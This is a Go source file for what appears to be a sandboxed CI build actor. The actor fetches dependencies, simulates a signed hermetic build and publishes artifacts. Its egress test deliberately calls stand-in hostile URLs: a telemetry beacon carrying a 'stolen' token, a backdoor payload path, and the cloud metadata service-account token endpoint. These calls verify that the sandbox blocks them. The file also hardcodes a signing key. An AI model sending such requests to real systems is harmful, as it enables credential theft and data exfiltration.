// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"slices"
	"strings"
	"sync"
	"time"
)

const (
	PhaseIdle                 = "IDLE"
	PhaseDependencyFetch      = "DEPENDENCY_FETCH"
	PhaseHermeticCompile      = "HERMETIC_COMPILE_AND_TEST"
	PhaseArtifactPublish      = "ARTIFACT_PUBLISH"
	PhaseCompleted            = "COMPLETED"

	DefaultMirrorURL   = "http://buildbox-gateway.anything-but-agents.svc.cluster.local"
	DefaultRegistryURL = "http://buildbox-gateway.anything-but-agents.svc.cluster.local"

	RogueExternalHost = "http://telemetry.sketchy-ci.example/beacon?token=stolen-auth-token-exfil"
	RogueMirrorProbe  = "http://buildbox-gateway.anything-but-agents.svc.cluster.local/api/mirror/pkgs/backdoor-payload"
	RogueMetadataHost = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
)

// CachedPackage represents an in-memory compiler dependency held in Go heap RAM.
type CachedPackage struct {
	Name      string    `json:"name"`
	Version   string    `json:"version"`
	SizeBytes int       `json:"size_bytes"`
	Checksum  string    `json:"checksum"`
	License   string    `json:"license"`
	FetchedAt time.Time `json:"fetched_at"`
}

// SBOMComponent captures software bill of materials metadata for SLSA provenance.
type SBOMComponent struct {
	Name     string `json:"name"`
	Version  string `json:"version"`
	PURL     string `json:"purl"`
	Hash     string `json:"hash"`
	License  string `json:"license"`
}

// BuildArtifactRecord stores the signed hermetic build output.
type BuildArtifactRecord struct {
	JobName        string          `json:"job_name"`
	BinaryDigest   string          `json:"binary_digest"`
	GitCommit      string          `json:"git_commit"`
	SBOM           []SBOMComponent `json:"sbom"`
	Signature      string          `json:"signature"`
	AirgapVerified bool            `json:"airgap_verified"`
	BuiltAt        time.Time       `json:"built_at"`
	DurationMs     int64           `json:"duration_ms"`
	ReleaseURI     string          `json:"release_uri,omitempty"`
}

// EgressAuditEntry tracks every outbound DNS, HTTP, or TCP attempt from the actor.
type EgressAuditEntry struct {
	ID         string    `json:"id"`
	Timestamp  time.Time `json:"timestamp"`
	Phase      string    `json:"phase"`
	TargetURL  string    `json:"target_url"`
	Method     string    `json:"method"`
	Protocol   string    `json:"protocol"` // "HTTP", "DNS", "TCP"
	Status     string    `json:"status"`   // "ALLOWED", "DENIED", "NXDOMAIN", "BLOCKED"
	StatusCode int       `json:"status_code"`
	LatencyMs  int64     `json:"latency_ms"`
	Error      string    `json:"error,omitempty"`
	Evidence   string    `json:"evidence"`
}

// RogueProbeResult holds the outcome of an individual exfiltration probe.
type RogueProbeResult struct {
	ProbeName       string `json:"probe_name"`
	TargetURL       string `json:"target_url"`
	ExpectedBlocked bool   `json:"expected_blocked"`
	Blocked         bool   `json:"blocked"`
	FailureReason   string `json:"failure_reason"`
	RawError        string `json:"raw_error,omitempty"`
	HTTPStatus      int    `json:"http_status"`
	LatencyMs       int64  `json:"latency_ms"`
}

// RogueTestSummary aggregates all 3 rogue probes for hermetic airgap proof.
type RogueTestSummary struct {
	Timestamp  time.Time          `json:"timestamp"`
	Phase      string             `json:"phase"`
	AllBlocked bool               `json:"all_blocked"`
	Verdict    string             `json:"verdict"`
	Probes     []RogueProbeResult `json:"probes"`
}

// BuildJobTracker represents the public snapshot of a build actor's state.
type BuildJobTracker struct {
	JobName           string               `json:"job_name"`
	Label             string               `json:"label"`
	Phase             string               `json:"phase"`
	Status            string               `json:"status"` // "RUNNING" or "SUSPENDED"
	CurrentPodIP      string               `json:"current_pod_ip"`
	PodIPHistory      []string             `json:"pod_ip_history"`
	CacheEntries      []CachedPackage      `json:"cache_entries"`
	CacheSizeBytes    int                  `json:"cache_size_bytes"`
	CacheHitRatePct   float64              `json:"cache_hit_rate_pct"`
	TotalCompiles     int                  `json:"total_compiles"`
	BuildArtifact     *BuildArtifactRecord `json:"build_artifact,omitempty"`
	LastRogueTest     *RogueTestSummary    `json:"last_rogue_test,omitempty"`
	AuditLog          []EgressAuditEntry   `json:"audit_log"`
	LastUpdated       time.Time            `json:"last_updated"`
	WorkerPodName     string               `json:"worker_pod_name,omitempty"`
	ActiveEgressRules int                  `json:"active_egress_rules"`
	EgressPolicyYAML  string               `json:"egress_policy_yaml,omitempty"`
}

// Buildbox represents the stateful in-memory build actor running inside gVisor.
type Buildbox struct {
	mu           sync.Mutex
	jobName      string
	phase        string
	currentPodIP string
	podIPHistory []string
	cache        map[string]CachedPackage
	cacheHits    int
	cacheMisses  int
	compiles     int
	artifact     *BuildArtifactRecord
	lastRogue    *RogueTestSummary
	auditLog     []EgressAuditEntry
	auditCounter int
	mirrorURL    string
	registryURL  string
	httpClient   *http.Client
}

// NewBuildbox creates a new build actor instance.
func NewBuildbox(jobName string, mirrorURL, registryURL string) *Buildbox {
	if jobName == "" {
		jobName = "build-pr-104"
	}
	if mirrorURL == "" {
		mirrorURL = DefaultMirrorURL
	}
	if registryURL == "" {
		registryURL = DefaultRegistryURL
	}

	podIP := getLocalIP()
	b := &Buildbox{
		jobName:      jobName,
		phase:        PhaseIdle,
		currentPodIP: podIP,
		podIPHistory: []string{podIP},
		cache:        make(map[string]CachedPackage),
		mirrorURL:    mirrorURL,
		registryURL:  registryURL,
		httpClient: &http.Client{
			Timeout: 2 * time.Second,
			Transport: &http.Transport{
				DialContext: (&net.Dialer{
					Timeout: 1 * time.Second,
				}).DialContext,
				DisableKeepAlives: true,
			},
		},
	}
	return b
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
	}
	return "169.254.17.2"
}

// State returns a snapshot copy of the current build actor state.
func (b *Buildbox) State(overridePodIP string) BuildJobTracker {
	b.mu.Lock()
	defer b.mu.Unlock()

	if overridePodIP != "" && overridePodIP != b.currentPodIP {
		b.currentPodIP = overridePodIP
		if !slices.Contains(b.podIPHistory, overridePodIP) {
			b.podIPHistory = append(b.podIPHistory, overridePodIP)
		}
	}

	cacheList := make([]CachedPackage, 0, len(b.cache))
	totalBytes := 0
	for _, pkg := range b.cache {
		cacheList = append(cacheList, pkg)
		totalBytes += pkg.SizeBytes
	}
	slices.SortFunc(cacheList, func(a, b CachedPackage) int {
		return strings.Compare(a.Name, b.Name)
	})

	totalAccesses := b.cacheHits + b.cacheMisses
	hitRate := 0.0
	if totalAccesses > 0 {
		hitRate = float64(b.cacheHits) / float64(totalAccesses) * 100.0
	} else if b.compiles > 0 || len(b.cache) > 0 {
		hitRate = 100.0
	}

	auditCopy := slices.Clone(b.auditLog)
	slices.Reverse(auditCopy) // Newest first for UI feed

	activeRules := 0
	switch b.phase {
	case PhaseDependencyFetch, PhaseArtifactPublish:
		activeRules = 1
	case PhaseHermeticCompile:
		activeRules = 0
	}

	return BuildJobTracker{
		JobName:           b.jobName,
		Label:             formatJobLabel(b.jobName),
		Phase:             b.phase,
		Status:            "RUNNING",
		CurrentPodIP:      b.currentPodIP,
		PodIPHistory:      slices.Clone(b.podIPHistory),
		CacheEntries:      cacheList,
		CacheSizeBytes:    totalBytes,
		CacheHitRatePct:   hitRate,
		TotalCompiles:     b.compiles,
		BuildArtifact:     b.artifact,
		LastRogueTest:     b.lastRogue,
		AuditLog:          auditCopy,
		LastUpdated:       time.Now().UTC(),
		ActiveEgressRules: activeRules,
	}
}

func formatJobLabel(name string) string {
	switch name {
	case "build-pr-104":
		return "build-pr-104 (Fast Feature Branch)"
	case "build-release-v2":
		return "build-release-v2 (Production Golden Release)"
	case "build-hotfix-88":
		return "build-hotfix-88 (Emergency Hotfix)"
	default:
		return name
	}
}

func (b *Buildbox) recordAuditLocked(phase, targetURL, method, protocol, status string, code int, latencyMs int64, errStr, evidence string) {
	b.auditCounter++
	entry := EgressAuditEntry{
		ID:         fmt.Sprintf("probe-%04d", b.auditCounter),
		Timestamp:  time.Now().UTC(),
		Phase:      phase,
		TargetURL:  targetURL,
		Method:     method,
		Protocol:   protocol,
		Status:     status,
		StatusCode: code,
		LatencyMs:  latencyMs,
		Error:      errStr,
		Evidence:   evidence,
	}
	b.auditLog = append(b.auditLog, entry)
	if len(b.auditLog) > 100 {
		b.auditLog = b.auditLog[len(b.auditLog)-100:]
	}
}

// FetchDependencies pulls dependencies into the warm Go heap cache.
func (b *Buildbox) FetchDependencies(ctx context.Context, mirrorOverride string) error {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.phase = PhaseDependencyFetch
	mirror := b.mirrorURL
	if mirrorOverride != "" {
		mirror = mirrorOverride
	}

	standardPkgs := []struct {
		name    string
		version string
		size    int
		hash    string
		license string
	}{
		{"pkg/core", "v1.4.2", 14889728, "sha256:7a81c4e9b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6", "Apache-2.0"},
		{"pkg/crypto", "v2.1.0", 8388608, "sha256:3b94a8f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9", "BSD-3-Clause"},
		{"pkg/transport", "v0.9.1", 11534336, "sha256:9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e", "MIT"},
	}

	for _, p := range standardPkgs {
		start := time.Now()
		reqURL := fmt.Sprintf("%s/api/mirror/pkgs/%s", strings.TrimRight(mirror, "/"), strings.TrimPrefix(p.name, "pkg/"))
		var resp *http.Response
		var err error
		for attempt := 0; attempt < 6; attempt++ {
			var req *http.Request
			req, err = http.NewRequestWithContext(ctx, http.MethodGet, reqURL, nil)
			if err != nil {
				return err
			}
			resp, err = b.httpClient.Do(req)
			if err == nil {
				break
			}
			if !strings.Contains(err.Error(), "no such host") && !strings.Contains(err.Error(), "NXDOMAIN") {
				break
			}
			time.Sleep(250 * time.Millisecond)
		}
		latency := time.Since(start).Milliseconds()
		if err != nil {
			errStr := err.Error()
			status := "DENIED"
			if strings.Contains(errStr, "no such host") || strings.Contains(errStr, "NXDOMAIN") {
				status = "NXDOMAIN"
			}
			b.recordAuditLocked(PhaseDependencyFetch, reqURL, "GET", "HTTP/DNS", status, 0, latency, errStr,
				"EgressPolicy blocked package mirror connection")
			return fmt.Errorf("dependency fetch failed for %s: %w", p.name, err)
		}
		_ = resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			b.recordAuditLocked(PhaseDependencyFetch, reqURL, "GET", "HTTP", "DENIED", resp.StatusCode, latency,
				fmt.Sprintf("HTTP %d", resp.StatusCode), "Package mirror rejected request")
			return fmt.Errorf("dependency fetch returned %d for %s", resp.StatusCode, p.name)
		}

		// Cache package in memory
		b.cache[p.name] = CachedPackage{
			Name:      p.name,
			Version:   p.version,
			SizeBytes: p.size,
			Checksum:  p.hash,
			License:   p.license,
			FetchedAt: time.Now().UTC(),
		}
		b.recordAuditLocked(PhaseDependencyFetch, reqURL, "GET", "HTTP", "ALLOWED", http.StatusOK, latency,
			"", fmt.Sprintf("Fetched %s@%s (%d bytes) into heap RAM", p.name, p.version, p.size))
	}

	return nil
}

// PopulateSimulatedCache fills the cache with standard dependencies in simulation mode.
func (b *Buildbox) PopulateSimulatedCache() {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.phase = PhaseDependencyFetch
	standardPkgs := []CachedPackage{
		{Name: "pkg/core", Version: "v1.4.2", SizeBytes: 14889728, Checksum: "sha256:7a81c4e9b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6", License: "Apache-2.0", FetchedAt: time.Now().UTC()},
		{Name: "pkg/crypto", Version: "v2.1.0", SizeBytes: 8388608, Checksum: "sha256:3b94a8f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9", License: "BSD-3-Clause", FetchedAt: time.Now().UTC()},
		{Name: "pkg/transport", Version: "v0.9.1", SizeBytes: 11534336, Checksum: "sha256:9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e", License: "MIT", FetchedAt: time.Now().UTC()},
	}

	for _, p := range standardPkgs {
		b.cache[p.Name] = p
		reqURL := fmt.Sprintf("%s/api/mirror/pkgs/%s", strings.TrimRight(b.mirrorURL, "/"), strings.TrimPrefix(p.Name, "pkg/"))
		b.recordAuditLocked(PhaseDependencyFetch, reqURL, "GET", "HTTP", "ALLOWED", http.StatusOK, 12,
			"", fmt.Sprintf("Fetched %s@%s (%d bytes) into heap RAM", p.Name, p.Version, p.SizeBytes))
	}
}

// CompileAndTest executes a hermetic build strictly against warm in-memory cache.
func (b *Buildbox) CompileAndTest(_ context.Context) error {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.phase = PhaseHermeticCompile
	if len(b.cache) == 0 {
		return errors.New("cannot compile hermetically: in-memory cache is empty (fetch dependencies first)")
	}

	// Cache hits for all dependencies
	b.cacheHits += len(b.cache)
	b.compiles++

	commitSHA := generateCommitSHA(b.jobName, b.compiles)
	h := sha256.New()
	h.Write([]byte(b.jobName))
	h.Write([]byte(commitSHA))
	for _, pkg := range b.cache {
		h.Write([]byte(pkg.Checksum))
	}
	binaryDigest := "sha256:" + hex.EncodeToString(h.Sum(nil))

	sbom := make([]SBOMComponent, 0, len(b.cache))
	for _, pkg := range b.cache {
		sbom = append(sbom, SBOMComponent{
			Name:    pkg.Name,
			Version: pkg.Version,
			PURL:    fmt.Sprintf("pkg:golang/%s@%s", pkg.Name, pkg.Version),
			Hash:    pkg.Checksum,
			License: pkg.License,
		})
	}

	sigKey := []byte("substrate-slsa-attestation-key-2026")
	mac := hmac.New(sha256.New, sigKey)
	mac.Write([]byte(binaryDigest))
	mac.Write([]byte(commitSHA))
	sigHex := "sig-hmac-sha256:" + hex.EncodeToString(mac.Sum(nil))[:32]

	b.artifact = &BuildArtifactRecord{
		JobName:        b.jobName,
		BinaryDigest:   binaryDigest,
		GitCommit:      commitSHA,
		SBOM:           sbom,
		Signature:      sigHex,
		AirgapVerified: (b.lastRogue != nil && b.lastRogue.AllBlocked),
		BuiltAt:        time.Now().UTC(),
		DurationMs:     420,
	}

	b.recordAuditLocked(PhaseHermeticCompile, "localhost:memory", "EXEC", "INTERNAL", "ALLOWED", 0, 420, "",
		fmt.Sprintf("100%% warm in-memory compilation completed (%d packages in heap RAM)", len(b.cache)))

	return nil
}

func generateCommitSHA(jobName string, rev int) string {
	h := sha256.Sum256([]byte(fmt.Sprintf("%s-rev-%d-2026", jobName, rev)))
	return hex.EncodeToString(h[:])[:12]
}

// TestRogueEgress deliberately triggers 3 unauthorized outbound calls.
// All 3 must fail to prove hermetic airgap enforcement.
func (b *Buildbox) TestRogueEgress(ctx context.Context) (RogueTestSummary, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	summary := RogueTestSummary{
		Timestamp:  time.Now().UTC(),
		Phase:      b.phase,
		AllBlocked: true,
	}

	// 1. External telemetry probe
	p1 := b.probeHost(ctx, "Unapproved External CI Telemetry", RogueExternalHost)
	summary.Probes = append(summary.Probes, p1)
	if !p1.Blocked {
		summary.AllBlocked = false
	}
	b.recordAuditLocked(b.phase, RogueExternalHost, "GET", "DNS/TCP",
		statusFromProbe(p1), p1.HTTPStatus, p1.LatencyMs, p1.RawError, p1.FailureReason)

	// 2. Package mirror during compile
	p2 := b.probeHost(ctx, "Unauthorized Package Mirror Access During Compile", RogueMirrorProbe)
	summary.Probes = append(summary.Probes, p2)
	if !p2.Blocked {
		summary.AllBlocked = false
	}
	b.recordAuditLocked(b.phase, RogueMirrorProbe, "GET", "HTTP/DNS",
		statusFromProbe(p2), p2.HTTPStatus, p2.LatencyMs, p2.RawError, p2.FailureReason)

	// 3. Cloud Link-Local Metadata (169.254.169.254)
	p3 := b.probeHost(ctx, "GCP/K8s Link-Local Metadata (169.254.169.254)", RogueMetadataHost)
	summary.Probes = append(summary.Probes, p3)
	if !p3.Blocked {
		summary.AllBlocked = false
	}
	b.recordAuditLocked(b.phase, RogueMetadataHost, "GET", "TCP/IP",
		statusFromProbe(p3), p3.HTTPStatus, p3.LatencyMs, p3.RawError, p3.FailureReason)

	if summary.AllBlocked {
		summary.Verdict = "100% Hermetic Airgap Verified (3/3 Rogue Probes Refused)"
		if b.artifact != nil {
			b.artifact.AirgapVerified = true
		}
	} else {
		summary.Verdict = "AIRGAP BREACH DETECTED (Outbound egress permitted during hermetic phase)"
	}

	b.lastRogue = &summary
	return summary, nil
}

func statusFromProbe(p RogueProbeResult) string {
	if !p.Blocked {
		return "ALLOWED (BREACH)"
	}
	if strings.Contains(p.RawError, "NXDOMAIN") || strings.Contains(p.RawError, "no such host") {
		return "NXDOMAIN"
	}
	if p.HTTPStatus == http.StatusForbidden {
		return "403_FORBIDDEN"
	}
	return "BLOCKED"
}

func (b *Buildbox) probeHost(ctx context.Context, name, targetURL string) RogueProbeResult {
	start := time.Now()
	probeCtx, cancel := context.WithTimeout(ctx, 1500*time.Millisecond)
	defer cancel()

	req, err := http.NewRequestWithContext(probeCtx, http.MethodGet, targetURL, nil)
	if err != nil {
		return RogueProbeResult{
			ProbeName:       name,
			TargetURL:       targetURL,
			ExpectedBlocked: true,
			Blocked:         true,
			FailureReason:   "Request initialization rejected",
			RawError:        err.Error(),
			LatencyMs:       time.Since(start).Milliseconds(),
		}
	}

	resp, err := b.httpClient.Do(req)
	latency := time.Since(start).Milliseconds()
	if err != nil {
		errStr := err.Error()
		reason := "Blocked by Substrate EgressPolicy / DNS Relay"
		if strings.Contains(errStr, "no such host") || strings.Contains(errStr, "NXDOMAIN") {
			reason = "DNS relay returned NXDOMAIN (host not in EgressPolicy)"
		} else if strings.Contains(errStr, "connection refused") || strings.Contains(errStr, "network is unreachable") {
			reason = "nftables / ateworker packet filter dropped connection"
		}
		return RogueProbeResult{
			ProbeName:       name,
			TargetURL:       targetURL,
			ExpectedBlocked: true,
			Blocked:         true,
			FailureReason:   reason,
			RawError:        errStr,
			LatencyMs:       latency,
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusForbidden || resp.StatusCode == http.StatusBadGateway {
		return RogueProbeResult{
			ProbeName:       name,
			TargetURL:       targetURL,
			ExpectedBlocked: true,
			Blocked:         true,
			FailureReason:   fmt.Sprintf("HTTP %d Forbidden by atenet-egress PEP", resp.StatusCode),
			HTTPStatus:      resp.StatusCode,
			LatencyMs:       latency,
		}
	}

	// Unexpected success = leak!
	return RogueProbeResult{
		ProbeName:       name,
		TargetURL:       targetURL,
		ExpectedBlocked: true,
		Blocked:         false,
		FailureReason:   fmt.Sprintf("LEAK: Target responded with HTTP %d", resp.StatusCode),
		HTTPStatus:      resp.StatusCode,
		LatencyMs:       latency,
	}
}

// PublishArtifact releases the signed binary to the internal Artifact Registry.
func (b *Buildbox) PublishArtifact(ctx context.Context, registryOverride string) (*BuildArtifactRecord, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.phase = PhaseArtifactPublish
	if b.artifact == nil {
		return nil, errors.New("cannot publish: no compiled artifact found (compile and test first)")
	}

	regURL := b.registryURL
	if registryOverride != "" {
		regURL = registryOverride
	}

	target := fmt.Sprintf("%s/api/registry/releases", strings.TrimRight(regURL, "/"))
	payload, err := json.Marshal(b.artifact)
	if err != nil {
		return nil, err
	}

	start := time.Now()
	var resp *http.Response
	for attempt := 0; attempt < 6; attempt++ {
		var req *http.Request
		req, err = http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(payload))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/json")
		resp, err = b.httpClient.Do(req)
		if err == nil {
			break
		}
		if !strings.Contains(err.Error(), "no such host") && !strings.Contains(err.Error(), "NXDOMAIN") {
			break
		}
		time.Sleep(250 * time.Millisecond)
	}
	latency := time.Since(start).Milliseconds()
	if err != nil {
		b.recordAuditLocked(PhaseArtifactPublish, target, "POST", "HTTP", "DENIED", 0, latency,
			err.Error(), "EgressPolicy blocked artifact registry upload")
		return nil, fmt.Errorf("artifact publish failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		b.recordAuditLocked(PhaseArtifactPublish, target, "POST", "HTTP", "DENIED", resp.StatusCode, latency,
			fmt.Sprintf("HTTP %d", resp.StatusCode), "Artifact registry refused release")
		return nil, fmt.Errorf("artifact registry returned %d", resp.StatusCode)
	}

	var regResp struct {
		ReleaseURI string `json:"release_uri"`
	}
	_ = json.NewDecoder(resp.Body).Decode(&regResp)
	if regResp.ReleaseURI != "" {
		b.artifact.ReleaseURI = regResp.ReleaseURI
	} else {
		b.artifact.ReleaseURI = fmt.Sprintf("us-docker.pkg.dev/internal-repo/releases/%s@%s", b.jobName, b.artifact.BinaryDigest)
	}

	b.recordAuditLocked(PhaseArtifactPublish, target, "POST", "HTTP", "ALLOWED", resp.StatusCode, latency,
		"", fmt.Sprintf("Published signed binary & SBOM to registry: %s", b.artifact.ReleaseURI))

	// Probe mirror to prove it is still BLOCKED in Phase 3
	mirrorProbeURL := fmt.Sprintf("%s/api/mirror/pkgs/probe", strings.TrimRight(b.mirrorURL, "/"))
	probeReq, _ := http.NewRequestWithContext(ctx, http.MethodGet, mirrorProbeURL, nil)
	probeResp, probeErr := b.httpClient.Do(probeReq)
	if probeErr == nil {
		_ = probeResp.Body.Close()
		status := "BLOCKED"
		if probeResp.StatusCode == http.StatusOK {
			status = "ALLOWED"
		}
		b.recordAuditLocked(PhaseArtifactPublish, mirrorProbeURL, "GET", "HTTP", status, probeResp.StatusCode,
			10, "", "Phase 3 isolation probe: package mirror access verification")
	}

	b.phase = PhaseCompleted
	return b.artifact, nil
}

// Reset clears the build state back to IDLE while optionally retaining warm cache.
func (b *Buildbox) Reset(clearCache bool) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.phase = PhaseIdle
	b.artifact = nil
	b.lastRogue = nil
	if clearCache {
		b.cache = make(map[string]CachedPackage)
		b.cacheHits = 0
		b.cacheMisses = 0
		b.compiles = 0
	}
	b.recordAuditLocked(PhaseIdle, "local", "RESET", "SYSTEM", "ALLOWED", 0, 0, "", "Actor state reset to IDLE")
}

// ActorMux sets up HTTP routes exposed by the actor inside gVisor.
func ActorMux(b *Buildbox) *http.ServeMux {
	mux := http.NewServeMux()

	writeJSON := func(w http.ResponseWriter, code int, v any) {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.WriteHeader(code)
		enc := json.NewEncoder(w)
		enc.SetIndent("", "  ")
		_ = enc.Encode(v)
	}

	mux.HandleFunc("/readyz", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = io.WriteString(w, "ok\n")
	})

	mux.HandleFunc("/healthz", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = io.WriteString(w, "ok\n")
	})

	mux.HandleFunc("/state", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		overrideIP := r.Header.Get("X-Worker-Pod-IP")
		state := b.State(overrideIP)
		writeJSON(w, http.StatusOK, state)
	})

	mux.HandleFunc("/action/fetch-deps", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			MirrorURL string `json:"mirror_url"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		if err := b.FetchDependencies(r.Context(), req.MirrorURL); err != nil {
			writeJSON(w, http.StatusBadGateway, map[string]any{"error": err.Error(), "state": b.State("")})
			return
		}
		writeJSON(w, http.StatusOK, b.State(""))
	})

	mux.HandleFunc("/action/compile-test", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		if err := b.CompileAndTest(r.Context()); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": err.Error(), "state": b.State("")})
			return
		}
		writeJSON(w, http.StatusOK, b.State(""))
	})

	mux.HandleFunc("/action/test-rogue-egress", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		summary, _ := b.TestRogueEgress(r.Context())
		writeJSON(w, http.StatusOK, map[string]any{
			"summary": summary,
			"state":   b.State(""),
		})
	})

	mux.HandleFunc("/action/publish-artifact", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			RegistryURL string `json:"registry_url"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		artifact, err := b.PublishArtifact(r.Context(), req.RegistryURL)
		if err != nil {
			writeJSON(w, http.StatusBadGateway, map[string]any{"error": err.Error(), "state": b.State("")})
			return
		}
		writeJSON(w, http.StatusOK, map[string]any{
			"artifact": artifact,
			"state":    b.State(""),
		})
	})

	mux.HandleFunc("/action/reset", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			ClearCache bool `json:"clear_cache"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		b.Reset(req.ClearCache)
		writeJSON(w, http.StatusOK, b.State(""))
	})

	return mux
}
